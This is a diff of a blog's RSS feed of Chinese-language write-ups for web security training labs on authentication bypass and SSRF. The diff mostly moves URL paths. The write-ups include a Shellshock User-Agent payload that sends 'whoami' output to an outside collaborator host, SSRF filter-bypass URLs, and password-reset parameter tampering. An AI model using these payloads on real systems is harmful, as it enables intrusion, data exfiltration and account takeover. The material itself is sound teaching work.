+&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-3.jpg">&lt;/li>
 &lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>guest&lt;/code>，且其关键字为&lt;code>Invalid username or password&lt;/code>
-&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-4.jpg">&lt;/li>
+&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-4.jpg">&lt;/li>
 &lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
 &lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>mustang&lt;/code>
-&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-subtly-different-responses-5.jpg">&lt;/li>
+&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-5.jpg">&lt;/li>
 &lt;li>使用&lt;code>guest:mustang&lt;/code>登录后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset broken logic</title><link>/posts/authentication-lab-password-reset-broken-logic/</link><pubDate>Sun, 01 Dec 2024 12:09:59 +0800</pubDate><guid>/posts/authentication-lab-password-reset-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset broken logic</title><link>/posts/2024/authentication-lab-password-reset-broken-logic/</link><pubDate>Sun, 01 Dec 2024 12:09:59 +0800</pubDate><guid>/posts/2024/authentication-lab-password-reset-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
 &lt;li>点击登录页面下方&lt;code>Forgot password?&lt;/code>进行忘记密码流程，在输入框中输入&lt;code>wiener&lt;/code>，尝试重置&lt;code>wiener&lt;/code>用户密码&lt;/li>
 &lt;li>回到登录页面使用&lt;code>wiener:peter&lt;/code>登录&lt;code>wiener&lt;/code>用户，并点击上方&lt;code>Email client&lt;/code>查看重置密码邮件，点击链接后进入重置密码页面&lt;/li>
-&lt;li>填入所需信息后送出，请求为&lt;/li>
-&lt;/ol>
+&lt;li>填入所需信息后送出，请求为
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password?temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a060049043383ec80a812580035006b.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn&amp;amp;username=wiener&amp;amp;new-password-1=123&amp;amp;new-password-2=123
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>修改&lt;code>username&lt;/code>参数为&lt;code>carlos&lt;/code>后再次发送请求，登出&lt;code>wiener&lt;/code>用户后回到登录页面使用&lt;code>carlos:123&lt;/code>登录即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA simple bypass</title><link>/posts/authentication-lab-2fa-simple-bypass/</link><pubDate>Sun, 01 Dec 2024 11:45:06 +0800</pubDate><guid>/posts/authentication-lab-2fa-simple-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA simple bypass</title><link>/posts/2024/authentication-lab-2fa-simple-bypass/</link><pubDate>Sun, 01 Dec 2024 11:45:06 +0800</pubDate><guid>/posts/2024/authentication-lab-2fa-simple-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录，此时需要输入&lt;code>4-digit security code&lt;/code>，通过上方的&lt;code>Email client&lt;/code>按钮跳转页面后获得&lt;code>security code&lt;/code>，输入后跳转至&lt;code>/my-account&lt;/code>&lt;/li>
 &lt;li>尝试使用&lt;code>carlos:montoya&lt;/code>进行登录，登录后仍然需要输入&lt;code>4-digit security code&lt;/code>，但此时上方没有&lt;code>Email client&lt;/code>按钮，所以无法获得&lt;code>security code&lt;/code>&lt;/li>
 &lt;li>根据&lt;code>wiener&lt;/code>用户成功的登录逻辑，输入&lt;code>security code&lt;/code>后会跳转至&lt;code>/my-account&lt;/code>，所以在此之间将url修改为&lt;code>/my-account&lt;/code>，即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via different responses</title><link>/posts/authentication-lab-username-enumeration-via-different-responses/</link><pubDate>Sun, 01 Dec 2024 11:02:51 +0800</pubDate><guid>/posts/authentication-lab-username-enumeration-via-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via different responses</title><link>/posts/2024/authentication-lab-username-enumeration-via-different-responses/</link><pubDate>Sun, 01 Dec 2024 11:02:51 +0800</pubDate><guid>/posts/2024/authentication-lab-username-enumeration-via-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
 &lt;li>尝试随机输入&lt;code>Username&lt;/code>登录，页面上出现&lt;code>Invalid username&lt;/code>关键字
-&lt;img alt="Invalid username" src="/img/authentication-lab-username-enumeration-via-different-responses-2.jpg">&lt;/li>
+&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-2.jpg">&lt;/li>
 &lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Incorrect password&lt;/code>
-&lt;img alt="Negative search" src="/img/authentication-lab-username-enumeration-via-different-responses-3.jpg">&lt;/li>
+&lt;img alt="Negative search" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-3.jpg">&lt;/li>
 &lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>adm&lt;/code>，下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
 &lt;li>同样在过滤器中使用&lt;code>Negative search&lt;/code>功能过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>princess&lt;/code>
-&lt;img alt="Negative search" src="/img/authentication-lab-username-enumeration-via-different-responses-4.jpg">&lt;/li>
+&lt;img alt="Negative search" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-4.jpg">&lt;/li>
 &lt;li>使用&lt;code>adm:princess&lt;/code>登录后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/posts/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/posts/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/posts/2024/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/posts/2024/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>同&lt;a href="/posts/ssrf-lab-out-of-band-detection/">前题&lt;/a>，使用Burp Collaborator作为带外信息收集&lt;/li>
+&lt;li>同&lt;a href="/posts/2024/ssrf-lab-out-of-band-detection/">前题&lt;/a>，使用Burp Collaborator作为带外信息收集&lt;/li>
 &lt;li>此题建议使用&lt;a href="https://blog.cloudflare.com/inside-shellshock/">Shellshock&lt;/a>执行系统命令获得OS用户&lt;/li>
-&lt;li>在&lt;code>User-Agent&lt;/code>请求头写入Shellshock payload，在&lt;code>Referer&lt;/code>请求头指定内部服务器地址&lt;/li>
-&lt;/ol>
+&lt;li>在&lt;code>User-Agent&lt;/code>请求头写入Shellshock payload，在&lt;code>Referer&lt;/code>请求头指定内部服务器地址
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=8 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a8c00a60471f6ef82a26f06005400ee.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">() { ignored;};/usr/bin/nslookup $(whoami).g9qshqvqxiflz8z00kvd9oxt5kbcz4nt.oastify.com&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.0.xxx:8080&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>使用Burp Intruder遍历内部服务器地址(&lt;code>Referer&lt;/code>请求头)&lt;/li>
 &lt;li>回到Burp Collaborator观察即可获得OS用户(peter-PjP23W)，提交至页面后结束
-&lt;img alt="DNS query" src="/img/ssrf-lab-shellshock-exploitation-2.jpg">&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with out-of-band detection</title><link>/posts/ssrf-lab-out-of-band-detection/</link><pubDate>Sat, 30 Nov 2024 18:23:28 +0800</pubDate><guid>/posts/ssrf-lab-out-of-band-detection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p>
+&lt;img alt="DNS query" src="/img/2024/ssrf-lab-shellshock-exploitation-2.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with out-of-band detection</title><link>/posts/2024/ssrf-lab-out-of-band-detection/</link><pubDate>Sat, 30 Nov 2024 18:23:28 +0800</pubDate><guid>/posts/2024/ssrf-lab-out-of-band-detection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>此题目的是让用户熟悉Burp Collaborator如何使用&lt;/li>
 &lt;li>首先在Burp -&amp;gt; Collaborator -&amp;gt; 点击Copy to clipboard&lt;/li>
-&lt;li>将上步获得的url替换请求中的Referer，例如&lt;/li>
-&lt;/ol>
+&lt;li>将上步获得的url替换请求中的Referer，例如
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://3qufydcde5w8gvgnh7c0qbegm7sygp4e.oastify.com&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>发送请求后在Collaborator面板即可观察到相关信息&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with filter bypass via open redirection vulnerability</title><link>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</link><pubDate>Sat, 30 Nov 2024 15:55:02 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with filter bypass via open redirection vulnerability</title><link>/posts/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</link><pubDate>Sat, 30 Nov 2024 15:55:02 +0800</pubDate><guid>/posts/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>&lt;/li>
-&lt;li>直接在请求体中设置&lt;code>http://192.168.0.12:8080/admin&lt;/code>会获得错误&lt;/li>
-&lt;/ol>
+&lt;li>目标入口同&lt;a href="/posts/2024/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>&lt;/li>
+&lt;li>直接在请求体中设置&lt;code>http://192.168.0.12:8080/admin&lt;/code>会获得错误
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Invalid external stock check url &amp;#39;Invalid URL&amp;#39;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
-&lt;li>观察页面下方有&lt;code>Next product&lt;/code>按钮，对应请求为&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>观察页面下方有&lt;code>Next product&lt;/code>按钮，对应请求为
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product/nextProduct?currentProductId=1&amp;amp;path=/product?productId=2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>点击按钮后，页面将跳转至path参数地址，即为&lt;code>/product?productId=2&lt;/code>，利用此特性，将请求体设置为&lt;code>/product/nextProduct?currentProductId=1&amp;amp;path=&lt;/code>，后面接上目的地址，最终url请求体为&lt;code>%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.12:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with whitelist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-whitelist-filter/</link><pubDate>Sat, 30 Nov 2024 15:19:16 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-whitelist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with whitelist-based input filter</title><link>/posts/2024/ssrf-lab-ssrf-with-whitelist-filter/</link><pubDate>Sat, 30 Nov 2024 15:19:16 +0800</pubDate><guid>/posts/2024/ssrf-lab-ssrf-with-whitelist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了1个防止SSRF的防御措施&lt;/li>
-&lt;li>若将请求体设置为&lt;code>http://localhost/admin&lt;/code>会获得以下返回&lt;/li>
-&lt;/ol>
+&lt;li>目标入口同&lt;a href="/posts/2024/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了1个防止SSRF的防御措施&lt;/li>
+&lt;li>若将请求体设置为&lt;code>http://localhost/admin&lt;/code>会获得以下返回
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;External stock check host must be stock.weliketoshop.net&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>最终尝试到请求体为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with blacklist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-blacklist-filter/</link><pubDate>Sat, 30 Nov 2024 14:51:44 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-blacklist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with blacklist-based input filter</title><link>/posts/2024/ssrf-lab-ssrf-with-blacklist-filter/</link><pubDate>Sat, 30 Nov 2024 14:51:44 +0800</pubDate><guid>/posts/2024/ssrf-lab-ssrf-with-blacklist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了2个简单的防止SSRF的防御措施&lt;/li>
+&lt;li>目标入口同&lt;a href="/posts/2024/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了2个简单的防止SSRF的防御措施&lt;/li>
 &lt;li>2个简单的防止SSRF的防御措施分别在&lt;code>localhsot&lt;/code>以及&lt;code>admin&lt;/code>
 &lt;ul>
 &lt;li>&lt;code>localhsot&lt;/code>可以替换为&lt;code>lOcAlHost&lt;/code>或&lt;code>127.0.0.1&lt;/code>的变形，例如&lt;code>2130706433&lt;/code>、&lt;code>017700000001&lt;/code>、&lt;code>127.1. &lt;/code>&lt;/li>
@@ -779,22 +757,22 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/ul>
 &lt;/li>
 &lt;li>最终请求体为&lt;code>http://127.1/Admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://127.1/Admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against another back-end system</title><link>/posts/ssrf-lab-basic-ssrf-against-backend-system/</link><pubDate>Sat, 30 Nov 2024 11:47:06 +0800</pubDate><guid>/posts/ssrf-lab-basic-ssrf-against-backend-system/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against another back-end system</title><link>/posts/2024/ssrf-lab-basic-ssrf-against-backend-system/</link><pubDate>Sat, 30 Nov 2024 11:47:06 +0800</pubDate><guid>/posts/2024/ssrf-lab-basic-ssrf-against-backend-system/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题需要自行寻找admin interface&lt;/li>
+&lt;li>目标入口同&lt;a href="/posts/2024/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题需要自行寻找admin interface&lt;/li>
 &lt;li>使用Burp suite Intruder功能，自动遍历题目给出的范围&lt;code>192.168.0.x&lt;/code>，请求体为&lt;code>stockApi=http://192.168.0.§1§:8080/admin&lt;/code>，Number range从0至254&lt;/li>
 &lt;li>根据扫描结果，在参数为&lt;code>58&lt;/code>时获得response code 200，所以admin interface为&lt;code>http://192.168.0.58:8080/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.58:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against the local server</title><link>/posts/ssrf-lab-basic-ssrf-against-localhost/</link><pubDate>Sat, 30 Nov 2024 10:52:18 +0800</pubDate><guid>/posts/ssrf-lab-basic-ssrf-against-localhost/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
